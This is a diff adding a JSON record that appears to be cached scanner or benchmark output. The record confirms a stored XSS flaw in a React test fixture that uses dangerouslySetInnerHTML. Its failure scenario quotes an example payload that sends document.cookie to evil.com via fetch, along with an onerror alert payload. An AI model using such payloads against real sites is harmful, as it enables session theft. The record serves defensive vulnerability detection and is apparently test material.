@@ -1,0 +1,8 @@
+{
+  "key": "c32cf27563503ed635a576413e704bd7",
+  "file": "positive/xss/dangerously-set-inner-html.ts",
+  "model": "default",
+  "raw": "```json\n[\n  {\n    \"vulnSlug\": \"xss\",\n    \"lineNumbers\": [11],\n    \"verdict\": \"confirmed\",\n    \"severity\": \"high\",\n    \"summary\": \"Unsanitized HTML from external CMS is rendered directly via dangerouslySetInnerHTML, enabling stored XSS.\",\n    \"rationale\": \"The ArticleBody component accepts a rawHtml string parameter and renders it using React's dangerouslySetInnerHTML without any sanitization. The file comments explicitly state this HTML comes from 'an upstream CMS response' without a sanitizer pass. The dangerouslySetInnerHTML API bypasses React's XSS protections and inserts arbitrary HTML directly into the DOM. No sanitization library (e.g., DOMPurify) is imported or applied before rendering.\",\n    \"failureScenario\": \"An attacker compromises the CMS or exploits a misconfiguration to inject malicious HTML such as '<script>fetch(\\\"https://evil.com/steal?c=\\\"+document.cookie)</script>' or '<img src=x onerror=\\\"alert(document.cookie)\\\">'. When ArticleBody is called with this payload as rawHtml, the malicious script executes in every visitor's browser, enabling session hijacking, credential theft, or other attacks.\",\n    \"confidence\": 0.95\n  }\n]\n```",
+  "recordedAt": "2026-08-12T03:44:37.322Z",
+  "elapsedMs": 19733.745922727274
+}
